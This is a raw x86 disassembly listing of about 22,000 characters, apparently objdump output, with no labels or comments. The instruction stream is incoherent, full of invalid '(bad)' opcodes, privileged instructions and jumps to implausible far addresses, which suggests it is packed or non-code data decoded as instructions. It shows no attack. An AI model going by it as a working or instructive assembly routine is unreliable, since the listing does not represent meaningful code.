  417bb1:	sbb    esi,DWORD PTR [esi+0x7d]
  417bb4:	dec    esi
  417bb5:	mov    cs,WORD PTR [ecx+0x5816b89]
  417bbb:	xor    ah,ah
  417bbd:	add    ebp,esp
  417bbf:	sbb    DWORD PTR [ebx-0x2b],ecx
  417bc2:	or     esp,ebp
  417bc4:	mov    dl,0x9c
  417bc6:	mov    ebp,0xcd6af7b0
  417bcb:	xchg   edx,eax
  417bcc:	inc    edx
  417bcd:	outs   dx,DWORD PTR ds:[esi]
  417bce:	sar    DWORD PTR [eax-0x4dc2448b],0x72
  417bd5:	(bad)  [edx+0x2b]
  417bd8:	sub    al,0xb9
  417bda:	xor    cl,BYTE PTR [edi+0x2a9aa8c1]
  417be0:	(bad)  [edx]
  417be2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417be3:	repnz cmp DWORD PTR gs:0xd047e23a,ebx
  417beb:	add    BYTE PTR [eax+edi*1],ah
  417bee:	rcl    DWORD PTR [eax],1
  417bf0:	xchg   ebx,eax
  417bf1:	aaa    
  417bf2:	sbb    BYTE PTR [edi+0xd16b924],ah
  417bf8:	pop    ds
  417bf9:	jno    0x417b9e
  417bfb:	jo     0x417c5a
  417bfd:	mov    esi,0xdf3ec028
  417c02:	jae    0x417bd2
  417c04:	xchg   esi,eax
  417c05:	push   ds
  417c06:	dec    ebx
  417c07:	aaa    
  417c08:	outs   dx,DWORD PTR ds:[esi]
  417c09:	jmp    0x3e975453
  417c0e:	sub    edx,ecx
  417c10:	cmp    DWORD PTR ds:0xf13d9149,ebx
  417c16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c17:	lods   al,BYTE PTR ds:[esi]
  417c18:	xor    eax,0x8ee2ebce
  417c1d:	mov    dh,0xfe
  417c1f:	ins    BYTE PTR es:[edi],dx
  417c20:	mov    al,0x2
  417c22:	xor    BYTE PTR [esi+0x78],0x46
  417c26:	fnstsw WORD PTR [edi-0x6e]
  417c29:	call   0x2d80827f
  417c2e:	clc    
  417c2f:	and    edx,ebx
  417c31:	je     0x417c33
  417c33:	xchg   BYTE PTR [edi+0x766dfd6d],ah
  417c39:	cmp    DWORD PTR [esi],ebx
  417c3b:	retf   
  417c3c:	gs leave 
  417c3e:	jp     0x417be3
  417c40:	stos   DWORD PTR es:[edi],eax
  417c41:	aam    0xbc
  417c43:	mov    ah,0x21
  417c45:	sbb    BYTE PTR [ebx-0x1da16cfe],dl
  417c4b:	dec    esp
  417c4c:	and    ebp,DWORD PTR [edx+0x7c]
  417c4f:	mov    ds:0xb01b6df2,al
  417c54:	lods   al,BYTE PTR ds:[esi]
  417c55:	imul   esp,DWORD PTR [esp+ecx*4-0xb],0x1a359a4
  417c5d:	push   eax
  417c5e:	outs   dx,BYTE PTR ds:[esi]
  417c5f:	mov    eax,ds:0x84e77b4
  417c64:	mov    ecx,0x4104a519
  417c69:	(bad)  
  417c6a:	push   ebx
  417c6b:	stos   DWORD PTR es:[edi],eax
  417c6c:	sbb    dh,BYTE PTR [eax+0x2992e051]
  417c72:	icebp  
  417c73:	xor    bl,BYTE PTR [ebx+0x27faf19d]
  417c79:	in     al,dx
  417c7a:	push   ebx
  417c7b:	jne    0x417c07
  417c7d:	arpl   WORD PTR [eax],di
  417c7f:	jae    0x417c17
  417c81:	xchg   edi,eax
  417c82:	push   ds
  417c83:	mov    edx,0xc86bd613
  417c88:	xchg   edx,eax
  417c89:	jg     0x417c71
  417c8b:	shld   DWORD PTR ds:0x28519412,edi,0xbc
  417c93:	imul   edx,DWORD PTR [edi+0x7933bd19],0xd8819c0d
  417c9d:	adc    ebx,DWORD PTR [eax]
  417c9f:	mov    ebp,0x6475d9
  417ca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ca5:	mov    ebx,0xc0492ca0
  417caa:	and    cl,BYTE PTR [edx+0x23d23d0c]
  417cb0:	xor    edi,DWORD PTR [edx-0x57]
  417cb3:	(bad)  
  417cb4:	push   es
  417cb5:	pop    esi
  417cb6:	test   eax,0x7d2a899c
  417cbb:	imul   ecx,DWORD PTR [ebx],0xffffff90
  417cbe:	imul   eax,ecx,0x3d
  417cc1:	adc    ecx,edi
  417cc3:	sbb    ch,BYTE PTR [edi]
  417cc5:	add    al,0x66
  417cc7:	ret    
  417cc8:	dec    edi
  417cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cca:	jp     0x417d3f
  417ccc:	popa   
  417ccd:	fild   DWORD PTR [edx]
  417ccf:	gs mov esi,0xa054391
  417cd5:	in     eax,0xec
  417cd7:	daa    
  417cd8:	xchg   ecx,eax
  417cd9:	je     0x417c73
  417cdb:	pop    ebp
  417cdc:	or     al,0x48
  417cde:	into   
  417cdf:	mov    eax,ds:0x4b468df0
  417ce4:	hlt    
  417ce5:	comiss xmm3,DWORD PTR [ebp-0x781b9287]
  417cec:	pop    edx
  417ced:	xor    al,BYTE PTR [edx-0x37155c7f]
  417cf3:	int3   
  417cf4:	pop    esp
  417cf5:	dec    edi
  417cf6:	ret    
  417cf7:	push   es
  417cf8:	jnp    0x417caa
  417cfa:	jae    0x417c80
  417cfc:	call   0x26234ebc
  417d01:	shl    edx,1
  417d03:	xlat   BYTE PTR ds:[ebx]
  417d04:	cmp    eax,0x241a13e4
  417d09:	push   esp
  417d0a:	adc    eax,0x53611ec7
  417d0f:	imul   ecx,DWORD PTR [ecx-0x4d],0x7874bead
  417d16:	dec    ebp
  417d17:	or     DWORD PTR [edi+0x7b7a3fbb],ebx
  417d1d:	push   ds
  417d1e:	add    DWORD PTR [edx+edi*8-0x5efa2613],ebx
  417d25:	or     edi,DWORD PTR [edx+0x68f938d5]
  417d2b:	and    DWORD PTR [esi+0x31b91f46],0xffffffe5
  417d32:	cli    
  417d33:	mov    dl,0xa0
  417d35:	sub    eax,0xf0d53c13
  417d3a:	aaa    
  417d3b:	sub    al,0x36
  417d3d:	xor    al,0x4c
  417d3f:	jecxz  0x417d07
  417d41:	lods   al,BYTE PTR ds:[esi]
  417d42:	leave  
  417d43:	xchg   ecx,eax
  417d44:	(bad)  
  417d45:	cmp    esi,DWORD PTR [edx*8-0x475e04dd]
  417d4c:	xor    DWORD PTR [ebp+0x72],0x2d
  417d50:	add    esp,DWORD PTR [edx]
  417d52:	ror    DWORD PTR [eax-0x63c72aa6],1
  417d58:	jae    0x417d92
  417d5a:	push   0x9180447e
  417d5f:	mov    edx,0x71e40640
  417d64:	(bad)  
  417d67:	xor    ah,BYTE PTR [edx+eax*4]
  417d6a:	sbb    BYTE PTR [ebp+0x54],ah
  417d6d:	sub    edx,eax
  417d6f:	test   eax,0x9c497b2c
  417d74:	sar    DWORD PTR [esi-0x5f],0x2b
  417d78:	and    DWORD PTR [esi],edi
  417d7a:	jp     0x417dbd
  417d7c:	cwde   
  417d7d:	sahf   
  417d7e:	out    0xb3,al
  417d80:	add    DWORD PTR [ecx+0x17],edi
  417d83:	xchg   edx,eax
  417d84:	sbb    eax,0x1c547ea0
  417d89:	jl     0x417d0f
  417d8b:	mov    ds:0xd2cf752,eax
  417d90:	and    eax,0x998f6cff
  417d95:	xor    ebp,edi
  417d97:	mov    dh,0x94
  417d99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d9a:	js     0x417d8f
  417d9c:	xchg   bl,bl
  417d9e:	sub    DWORD PTR [ebp+0x48],ebp
  417da1:	or     DWORD PTR [ecx-0x6f],ecx
  417da4:	std    
  417da5:	push   es
  417da6:	cmp    al,0x30
  417da8:	ret    
  417da9:	icebp  
  417daa:	fnsave [edi]
  417dac:	and    eax,0x91af21b9
  417db1:	xor    eax,0x2fb98d5a
  417db6:	in     al,dx
  417db7:	enter  0x77ed,0x88
  417dbb:	out    dx,al
  417dbc:	inc    eax
  417dbd:	(bad)  
  417dbe:	cmp    eax,0xb8818c97
  417dc3:	jbe    0x417e04
  417dc5:	out    0xbd,al
  417dc7:	push   esi
  417dc8:	imul   edx,DWORD PTR [edi-0x794c376b],0x1d
  417dcf:	dec    esi
  417dd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dd1:	mov    WORD PTR [edx+0x42040d89],?
  417dd7:	jmp    0x530acfb6
  417ddc:	mov    ah,0xfb
  417dde:	ds push edx
  417de0:	sbb    BYTE PTR [eax-0x67baa366],bl
  417de6:	adc    DWORD PTR [edi+0x67],ebp
  417de9:	call   0x4656:0x6e1bb8a8
  417df0:	out    dx,eax
  417df1:	inc    ebx
  417df2:	repz fidivr DWORD PTR [eax]
  417df5:	ds sti 
  417df7:	loopne 0x417db4
  417df9:	push   ss
  417dfa:	(bad)  
  417dfb:	jecxz  0x417d87
  417dfd:	sub    ecx,DWORD PTR [ebp+0x410b61d1]
  417e03:	into   
  417e04:	test   DWORD PTR ds:0x20ef9b3e,edx
  417e0a:	popf   
  417e0b:	call   0xeabecb1b
  417e10:	cmp    BYTE PTR [esi-0x70],ch
  417e13:	jg     0x417e35
  417e15:	dec    ebp
  417e16:	not    DWORD PTR [ecx]
  417e18:	xor    eax,0xe1fd19d2
  417e1d:	cmp    al,0xf
  417e1f:	test   DWORD PTR [edx+0x72f57b1c],esp
  417e25:	jne    0x417def
  417e27:	ret    0xbe9a
  417e2a:	cmp    ecx,esp
  417e2c:	jg     0x417ea1
  417e2e:	mov    al,0x9b
  417e30:	sbb    BYTE PTR [esi],bh
  417e32:	xchg   BYTE PTR ss:[esi+0x1],dl
  417e36:	jmp    0x10a678c1
  417e3b:	cmp    eax,0xdbb68d95
  417e40:	xor    esi,DWORD PTR [esi]
  417e42:	out    0x7a,al
  417e44:	addr16 jns 0x417e9e
  417e47:	pushf  
  417e48:	test   BYTE PTR [ebp+0x1fab08d4],0x5
  417e4f:	imul   esp,DWORD PTR ds:0x949f4d4a,0xf09952cf
  417e59:	lds    edx,FWORD PTR [eax-0x4e]
  417e5c:	and    esi,ecx
  417e5e:	mov    ebx,0x848932b8
  417e63:	retf   0xd821
  417e66:	mov    edx,0xd602c796
  417e6b:	lods   al,BYTE PTR ds:[esi]
  417e6c:	mov    ds:0x2c3d6600,eax
  417e71:	sub    al,0x51
  417e73:	adc    cl,BYTE PTR [edx+0x12]
  417e76:	lgdtd  [ebx]
  417e79:	hlt    
  417e7a:	or     DWORD PTR [ecx],ebx
  417e7c:	add    dh,dl
  417e7e:	pop    ss
  417e7f:	cmp    DWORD PTR ds:[esi+0x54],edx
  417e83:	fild   QWORD PTR [esi-0x5a]
  417e86:	loop   0x417e49
  417e88:	aaa    
  417e89:	cmp    DWORD PTR [ecx+0x52],ebx
  417e8c:	cmc    
  417e8d:	nop
  417e8e:	fistp  DWORD PTR [eax-0x7b3e7b59]
  417e94:	push   ebx
  417e95:	mov    cl,0x1b
  417e97:	sbb    al,0x76
  417e99:	shl    ebp,1
  417e9b:	mov    dl,0xdc
  417e9d:	(bad)  
  417e9e:	jmp    0xd3ae37e9
  417ea3:	cmp    eax,0xd17848cb
  417ea8:	mov    bh,0x6c
  417eaa:	mov    ebx,0x508885ff
  417eaf:	icebp  
  417eb0:	mov    cl,0x2
  417eb2:	jb     0x417f2d
  417eb4:	pop    edx
  417eb5:	or     cl,bl
  417eb7:	int    0xb7
  417eb9:	mov    esp,0x11bf65b3
  417ebe:	rcl    DWORD PTR [ecx],0xed
  417ec1:	mov    esi,0xf8db5e85
  417ec6:	xchg   edx,eax
  417ec7:	jle    0x417ef7
  417ec9:	xor    esp,DWORD PTR [esi+0x3ceab21e]
  417ecf:	jl     0x417f48
  417ed1:	cmp    ebp,DWORD PTR [edx-0x677d49d3]
  417ed7:	or     BYTE PTR [eax+0x76],bl
  417eda:	inc    ebx
  417edb:	stos   BYTE PTR es:[edi],al
  417edc:	mov    ebp,0xe3c88422
  417ee1:	xchg   ebp,eax
  417ee2:	(bad)
  417ee7:	les    esi,FWORD PTR [edi]
  417ee9:	jmp    0x5642bf18
  417eee:	push   ebx
  417eef:	push   esi
  417ef0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ef1:	add    BYTE PTR [eax+esi*2],0xed
  417ef5:	imul   ecx,DWORD PTR [ebx+esi*4+0x5cef16c5],0x4af1131a
  417f00:	lock jmp 0xf1:0x87740a1
  417f08:	add    ebp,DWORD PTR [eax]
  417f0a:	cmp    dl,BYTE PTR [eax-0x64]
  417f0d:	aas    
  417f0e:	or     BYTE PTR [eax],cl
  417f10:	adc    dh,BYTE PTR [esi]
  417f12:	push   eax
  417f13:	mov    ch,0xf8
  417f15:	and    al,0x57
  417f17:	lods   al,BYTE PTR ds:[esi]
  417f18:	iret   
  417f19:	ror    BYTE PTR [ecx+edi*8+0xb],1
  417f1d:	sbb    al,0x62
  417f1f:	loope  0x417f4a
  417f21:	fs inc eax
  417f23:	test   ah,0x75
  417f26:	fs aas 
  417f28:	jne    0x417eb6
  417f2a:	push   edx
  417f2b:	ret    0x1e2f
  417f2e:	aaa    
  417f2f:	popa   
  417f30:	mov    al,BYTE PTR [ebp+0x2c94c2fb]
  417f36:	jmp    0x270f56d1
  417f3b:	retf   
  417f3c:	or     eax,0xc607e9
  417f41:	push   cs
  417f42:	sub    al,0x5d
  417f44:	test   DWORD PTR [eax],0x1bbe335e
  417f4a:	push   0x1e14a241
  417f4f:	pusha  
  417f50:	xor    bl,BYTE PTR [esi+eiz*4]
  417f53:	xchg   esp,eax
  417f54:	dec    ecx
  417f55:	adc    edx,DWORD PTR [esi+0x4a]
  417f58:	add    eax,0x117d4319
  417f5d:	mov    ecx,DWORD PTR [ebp-0x29]
  417f60:	fsubr  QWORD PTR ss:[eax+0x31]
  417f64:	cmp    edx,DWORD PTR ds:0xa4fe38e9
  417f6a:	mov    cr0,eax
  417f6d:	out    0x6c,al
  417f6f:	sub    eax,0x862a7cbf
  417f74:	sub    esp,DWORD PTR [eax]
  417f76:	add    BYTE PTR [esp+esi*1-0x20],0xb4
  417f7b:	cld    
  417f7c:	push   0xbdcea3e6
  417f81:	icebp  
  417f82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f83:	cwde   
  417f84:	cmp    al,ah
  417f86:	push   0x79
  417f88:	or     al,cl
  417f8a:	push   es
  417f8b:	inc    esp
  417f8c:	loope  0x417fc1
  417f8e:	aas    
  417f8f:	fsubr  DWORD PTR [esi-0x308c1834]
  417f95:	jg     0x417fc0
  417f97:	outs   dx,BYTE PTR ds:[esi]
  417f98:	(bad)  
  417f99:	shl    DWORD PTR [ebx],cl
  417f9b:	dec    ebp
  417f9c:	out    0xa,al
  417f9e:	pop    ecx
  417f9f:	push   esp
  417fa0:	fadd   QWORD PTR [ecx+0x3f46fc6c]
  417fa6:	add    ecx,ecx
  417fa8:	ficom  WORD PTR [edi+0x78]
  417fab:	jo     0x418025
  417fad:	mov    BYTE PTR [eax+0x7c],bl
  417fb0:	lea    ebp,[esi+edx*1]
  417fb3:	aaa    
  417fb4:	mov    eax,0xdc33532f
  417fb9:	cs jb  0x417f93
  417fbc:	and    al,0xb8
  417fbe:	fiadd  WORD PTR [edi]
  417fc0:	mov    ds:0xfb81a7e9,al
  417fc5:	out    dx,eax
  417fc6:	mov    bh,0x11
  417fc8:	sti    
  417fc9:	and    eax,DWORD PTR [edi]
  417fcb:	lods   eax,DWORD PTR ds:[esi]
  417fcc:	test   eax,0x4f1b4ad6
  417fd1:	cmc    
  417fd2:	pop    es
  417fd3:	aam    0xd8
  417fd5:	jmp    0x418049
  417fd7:	stos   BYTE PTR es:[edi],al
  417fd8:	and    al,0xa
  417fda:	dec    esp
  417fdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fde:	icebp  
  417fdf:	inc    edi
  417fe0:	in     eax,0x70
  417fe2:	add    cl,BYTE PTR [ecx+0x6b]
  417fe5:	lds    edi,FWORD PTR [ebx]
  417fe7:	xchg   BYTE PTR [ebp+0x6e],bh
  417fea:	loopne 0x417f95
  417fec:	mov    cl,0xc8
  417fee:	push   ss
  417fef:	aad    0x0
  417ff1:	out    dx,al
  417ff2:	cmp    eax,0xc9e77587
  417ff7:	dec    ebp
  417ff8:	hlt    
  417ff9:	mov    eax,0x3d2ad667
  417ffe:	fcomp  DWORD PTR [edx]
  418000:	dec    esp
  418001:	pusha  
  418002:	retf   0x8b0b
  418005:	jmp    0xca4d002e
  41800a:	in     al,0xbe
  41800c:	ret    
  41800d:	jo     0x41804b
  41800f:	cmp    BYTE PTR [eax-0x5e],dl
  418012:	push   0x24c7c52a
  418017:	int    0x9
  418019:	(bad)  
  41801a:	(bad)  
  41801c:	sar    cl,1
  41801e:	sbb    eax,0x2010398f
  418023:	or     ah,bh
  418025:	mov    ebx,0x3bf778d8
  41802a:	jg     0x417ff9
  41802c:	xor    al,BYTE PTR [ecx+edi*2-0x5c]
  418030:	sub    eax,0x8a6cbe1e
  418035:	(bad)  
  418036:	call   0xc329203f
  41803b:	call   0x4e66:0x30482901
  418042:	call   0xee5b:0x5b934cb4
  418049:	(bad)  
  41804a:	mov    bl,0xec
  41804c:	xor    al,0x95
  41804e:	pushf  
  41804f:	mov    es,WORD PTR [ecx-0x3bb2d73d]
  418055:	xlat   BYTE PTR ds:[ebx]
  418056:	lock sub eax,DWORD PTR [eax+eiz*8]
  41805a:	inc    esi
  41805b:	cmp    dl,BYTE PTR [eax-0x40bb9cea]
  418061:	push   ecx
  418062:	pop    ecx
  418063:	sub    edx,DWORD PTR [ecx+0x3febfc94]
  418069:	(bad)  
  41806a:	cmp    BYTE PTR [eax-0x1ef09991],dh
  418070:	jle    0x4180b8
  418072:	push   esi
  418073:	int    0xcf
  418075:	xor    al,0x18
  418077:	or     eax,0xd5fd9350
  41807c:	xchg   edi,eax
  41807d:	fild   DWORD PTR [ecx-0x555e5bf9]
  418083:	mov    bl,BYTE PTR [ebp+0x30]
  418086:	test   DWORD PTR [esi+0x14a5b59],ebp
  41808c:	in     eax,0xce
  41808e:	mov    esp,DWORD PTR [eax+0x33]
  418091:	stc    
  418092:	hlt    
  418093:	das    
  418094:	jnp    0x418065
  418096:	ret    0xceef
  418099:	dec    edi
  41809a:	cmc    
  41809b:	push   cs
  41809c:	popf   
  41809d:	push   esi
  41809e:	scas   eax,DWORD PTR es:[edi]
  41809f:	lea    edx,[ecx-0x17811d14]
  4180a5:	mov    edx,0x7cfe529e
  4180aa:	xchg   dl,al
  4180ac:	dec    edx
  4180ad:	xor    al,0x28
  4180af:	adc    eax,0x8c0556e0
  4180b4:	mov    eax,0x6e447516
  4180b9:	xchg   edi,eax
  4180ba:	mov    DWORD PTR [ebx+0x76],0x75e77b22
  4180c1:	sti    
  4180c2:	jle    0x418099
  4180c4:	jl     0x4180e7
  4180c6:	idiv   DWORD PTR [edx]
  4180c8:	sbb    bl,BYTE PTR [edx]
  4180ca:	int    0xbc
  4180cc:	cmp    al,0x97
  4180ce:	aam    0xbf
  4180d0:	dec    ebp
  4180d1:	imul   BYTE PTR [ebx-0x72]
  4180d4:	fst    QWORD PTR [esi+esi*4-0x36]
  4180d8:	pop    ss
  4180d9:	pushf  
  4180da:	cld    
  4180db:	dec    eax
  4180dc:	(bad)  
  4180dd:	(bad)  
  4180de:	test   eax,0xc1f9d0f
  4180e3:	imul   ecx,DWORD PTR [ecx+edx*8-0x7fac7854],0xe6ca700b
  4180ee:	add    al,0x5e
  4180f0:	lea    esi,[eax]
  4180f2:	popf   
  4180f3:	icebp  
  4180f4:	arpl   WORD PTR [esi+0x6e3a3721],si
  4180fa:	in     al,dx
  4180fb:	xrelease xchg BYTE PTR [edx-0x9],ch
  4180ff:	aam    0xb8
  418101:	jo     0x4180dc
  418103:	mov    esp,0x482321a7
  418108:	adc    eax,0xcd1447d9
  41810d:	gs mov cl,0x9
  418110:	adc    eax,0x33e19c4f
  418115:	xchg   esp,eax
  418116:	shl    DWORD PTR [ebx-0x30],0xb
  41811a:	mov    bl,0x76
  41811c:	inc    esp
  41811d:	mov    ?,ebx
  41811f:	xchg   ecx,eax
  418120:	cmc    
  418121:	icebp  
  418122:	jecxz  0x418114
  418124:	xchg   ecx,eax
  418125:	daa    
  418126:	pop    ebp
  418127:	mov    BYTE PTR [esi],bh
  418129:	mov    ecx,0x6374dca
  41812f:	xor    eax,0xf325f759
  418134:	mov    dh,0x16
  418136:	lahf   
  418137:	into   
  418138:	and    eax,0xf1fab63
  41813d:	push   edi
  41813e:	mov    edi,esi
  418140:	retf   0x4e79
  418143:	stos   BYTE PTR es:[edi],al
  418144:	neg    DWORD PTR [ebp+eiz*8-0x1bec046f]
  41814b:	lds    ecx,FWORD PTR [ebp-0x66e237c8]
  418151:	sbb    dl,BYTE PTR [ebx+ecx*8-0x1410449c]
  418158:	lock mov ebp,esp
  41815b:	test   al,0xf2
  41815d:	adc    ebx,ebp
  41815f:	ins    BYTE PTR es:[edi],dx
  418160:	or     eax,0x5d117452
  418165:	add    eax,0x7063e276
  41816a:	mov    ds:0xc935c2b7,al
  41816f:	mov    cl,0x7e
  418171:	nop    edx
  418174:	arpl   WORD PTR [eax-0x20c69d5f],si
  41817a:	or     al,bh
  41817c:	in     al,dx
  41817d:	mov    bl,0xc
  41817f:	add    ch,cl
  418181:	xchg   ebp,eax
  418182:	inc    esp
  418183:	push   0x32808b09
  418188:	push   ebx
  418189:	repnz retf 0x7ce9
  41818d:	mov    edx,0xd3d61417
  418192:	push   edi
  418193:	mov    cl,0x47
  418195:	cs scas al,BYTE PTR es:[edi]
  418197:	xchg   ecx,eax
  418198:	clc    
  418199:	in     eax,dx
  41819a:	mov    ds:0x3d17bc13,al
  41819f:	cli    
  4181a0:	adc    BYTE PTR [edi],0x9c
  4181a3:	cmc    
  4181a4:	push   0x1b
  4181a6:	pop    ebp
  4181a7:	int    0x3c
  4181a9:	arpl   WORD PTR [ebp-0x79c1c746],sp
  4181af:	sub    eax,0x713c2b5a
  4181b4:	pop    esi
  4181b5:	in     al,dx
  4181b6:	mov    eax,ds:0xca4f0e8d
  4181bb:	add    edi,edi
  4181bd:	cmc    
  4181be:	lods   al,BYTE PTR ds:[esi]
  4181bf:	addr16 out 0x75,al
  4181c2:	inc    esi
  4181c3:	mov    eax,ds:0xdf2ab725
  4181c8:	pop    ebx
  4181c9:	cs xchg edi,eax
  4181cb:	(bad)  [esi+0x6e]
  4181ce:	push   edx
  4181cf:	pop    es
  4181d0:	mov    dl,bh
  4181d2:	jmp    0x41823d
  4181d4:	cmp    DWORD PTR [ecx-0xf],esp
  4181d7:	xchg   edi,eax
  4181d8:	call   0x1b472bdb
  4181dd:	pop    ebx
  4181de:	or     al,0xe
  4181e0:	sbb    eax,0xd9169f34
  4181e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181e6:	xchg   ebp,eax
  4181e7:	es sbb eax,0xa0ab31af
  4181ed:	(bad)  
  4181ee:	repz ja 0x4181a1
  4181f1:	scas   eax,DWORD PTR es:[edi]
  4181f2:	je     0x418249
  4181f4:	sub    dh,BYTE PTR [esi-0x76]
  4181f7:	test   BYTE PTR [edx+0x72abec72],dh
  4181fd:	arpl   WORD PTR [ebp+edx*8+0x61],ax
  418201:	shl    DWORD PTR [ebp-0x61],1
  418204:	mov    ch,0x9b
  418206:	fwait
  418207:	dec    edi
  418208:	fsubr  DWORD PTR [edx]
  41820a:	fisubr DWORD PTR [edi-0x72e8ec8e]
  418210:	adc    esp,DWORD PTR [ebp+0x72]
  418213:	loop   0x41823f
  418215:	xlat   BYTE PTR ds:[ebx]
  418216:	retf   0x21d8
  418219:	repnz xchg edx,eax
  41821b:	loope  0x4181d0
  41821d:	sub    BYTE PTR [ecx-0x75],dh
  418220:	ja     0x4181db
  418222:	neg    ebx
  418224:	cmp    edi,DWORD PTR [ebx]
  418226:	outs   dx,DWORD PTR gs:[esi]
  418228:	inc    eax
  418229:	fcomp  QWORD PTR [esi+0x6c9fd07c]
  41822f:	sahf   
  418230:	data16 jle 0x418226
  418233:	int    0x44
  418235:	div    edi
  418237:	cmc    
  418238:	push   0x5b
  41823a:	push   esi
  41823b:	in     eax,dx
  41823c:	lods   al,BYTE PTR ds:[esi]
  41823d:	xor    dh,BYTE PTR [ecx]
  41823f:	lods   eax,DWORD PTR ds:[esi]
  418240:	call   DWORD PTR [edi+0x1ceaa9c2]
  418246:	ds xchg ebx,eax
  418248:	and    al,0xe6
  41824a:	call   0xb44932b9
  41824f:	sub    edi,esp
  418251:	clc    
  418252:	jge    0x418210
  418254:	add    bl,BYTE PTR [ebp+eax*4-0xb]
  418258:	leave  
  418259:	cli    
  41825a:	cmp    eax,0x7bd274eb
  41825f:	shr    DWORD PTR [edx+0x50],0xed
  418263:	cs dec ebp
  418265:	sub    ah,BYTE PTR [edx-0x16]
  418268:	out    0x67,al
  41826a:	retf   
  41826b:	pop    ds
  41826c:	pop    edi
  41826d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41826e:	jmp    0xc656:0xf34ae026
  418275:	lods   al,BYTE PTR ds:[esi]
  418276:	hlt    
  418277:	mov    edi,0x47865002
  41827c:	add    edi,ebx
  41827e:	lea    ecx,[edx]
  418280:	inc    esp
  418281:	push   ebx
  418282:	ret    0xadc2
  418285:	add    bl,BYTE PTR [ecx-0x6620bf26]
  41828b:	test   DWORD PTR [ecx],0xd1726e27
  418291:	mov    eax,0xb6f33499
  418296:	ret    0x81e9
  418299:	pop    edi
  41829a:	mov    cl,0xe0
  41829c:	mov    bl,0x8c
  41829e:	xor    al,0xf3
  4182a0:	mov    bh,0x29
  4182a2:	bound  ebx,QWORD PTR [esi+ebx*8]
  4182a5:	lods   al,BYTE PTR ds:[esi]
  4182a6:	je     0x418312
  4182a8:	fstp   QWORD PTR gs:[ecx+0x71]
  4182ac:	das    
  4182ad:	mov    bh,0x14
  4182af:	addr16 (bad) 
  4182b2:	adc    ebp,ecx
  4182b4:	leave  
  4182b5:	imul   esp,DWORD PTR [esi+0xf],0xffffffb8
  4182b9:	loop   0x418334
  4182bb:	scas   al,BYTE PTR es:[edi]
  4182bc:	jl     0x418328
  4182be:	add    BYTE PTR [eax],dh
  4182c0:	push   ebx
  4182c1:	(bad)  
  4182c2:	push   esi
  4182c3:	mov    esi,0x641ea6aa
  4182c8:	xchg   esp,eax
  4182c9:	aas    
  4182ca:	ror    BYTE PTR [ebp+0x12],1
  4182cd:	jmp    0x6df2b4cf
  4182d2:	push   es
  4182d3:	sbb    esp,ebx
  4182d5:	aam    0x22
  4182d7:	adc    al,BYTE PTR [ecx]
  4182d9:	jmp    0x5da9c1f1
  4182de:	(bad)  
  4182df:	rcl    bl,1
  4182e1:	jb     0x41835d
  4182e3:	(bad)  
  4182e4:	ret    
  4182e5:	sbb    BYTE PTR [edx],dl
  4182e7:	fimul  WORD PTR [edi]
  4182e9:	xor    esi,DWORD PTR [edi+eiz*4+0x459d0a8c]
  4182f0:	(bad)  
  4182f1:	rol    BYTE PTR [ebp+0x7f],1
  4182f4:	arpl   WORD PTR [edi+edi*1],bp
  4182f7:	in     eax,dx
  4182f8:	das    
  4182f9:	(bad)  
  4182fa:	cmp    esi,esp
  4182fc:	xchg   ebp,eax
  4182fd:	inc    ebp
  4182fe:	jg     0x418334
  418300:	jbe    0x4182e1
  418302:	add    eax,0x41ebf885
  418307:	imul   edx,ecx,0xffffffed
  41830a:	jmp    0x9ba1:0x8b45b1d1
  418311:	mov    ds:0x740e9317,al
  418316:	sub    DWORD PTR [edi-0x7b],0x3d1f2a1
  41831d:	std    
  41831e:	and    ch,BYTE PTR [edi-0x7a]
  418321:	sti    
  418322:	cdq    
  418323:	push   esp
  418324:	or     ebx,ebx
  418326:	add    cl,ah
  418328:	dec    esp
  418329:	int3   
  41832a:	pushf  
  41832b:	sub    ah,dl
  41832d:	and    eax,0x9df0d668
  418332:	jb     0x4182b4
  418334:	and    ecx,DWORD PTR [esi+0x0]
  418337:	or     cl,BYTE PTR [edx+0x45]
  41833a:	shl    dl,0x8c
  41833d:	mov    bl,0x10
  41833f:	push   ss
  418340:	add    DWORD PTR [ecx],0x7eb0ea30
  418346:	mov    WORD PTR [eax+0x7c70d17a],?
  41834c:	xor    al,0x29
  41834e:	xor    dl,dl
  418350:	xlat   BYTE PTR ds:[ebx]
  418351:	push   ebp
  418352:	mov    ebx,0x955035be
  418357:	pop    esi
  418358:	inc    ebp
  418359:	mov    ecx,0xa1473248
  41835e:	cmp    esp,0x15
  418361:	add    cl,BYTE PTR [ebp+0x3434e248]
  418367:	rol    BYTE PTR [ebx],1
  418369:	lods   al,BYTE PTR ds:[esi]
  41836a:	push   edi
  41836b:	(bad)  
  41836c:	stc    
  41836d:	clc    
  41836e:	aam    0xc
  418370:	sub    bl,BYTE PTR [eax+0x7a5dad4c]
  418376:	out    dx,al
  418377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418378:	push   ebx
  41837a:	ss inc ebx
  41837c:	mov    esi,0x6222dad7
  418381:	adc    eax,0x1b80234f
  418386:	(bad)  
  418387:	sub    ebx,DWORD PTR [edi]
  418389:	or     BYTE PTR [eax],ah
  41838b:	scas   eax,DWORD PTR es:[edi]
  41838c:	inc    esp
  41838d:	aam    0x1c
  41838f:	or     BYTE PTR [ecx+0x77],0xc8
  418393:	jmp    0x418365
  418395:	mov    ah,0xe2
  418397:	pushf  
  418398:	imul   esi,DWORD PTR [esi],0x7aab238e
  41839e:	and    ah,ah
  4183a0:	sub    al,0xda
  4183a2:	lods   eax,DWORD PTR ds:[esi]
  4183a3:	adc    eax,0x5c2d16de
  4183a8:	mov    ecx,0x46b1da92
  4183ad:	fcom   DWORD PTR ds:0xa752bf3a
  4183b3:	cmp    dl,ah
  4183b5:	xchg   edi,eax
  4183b6:	pop    ebp
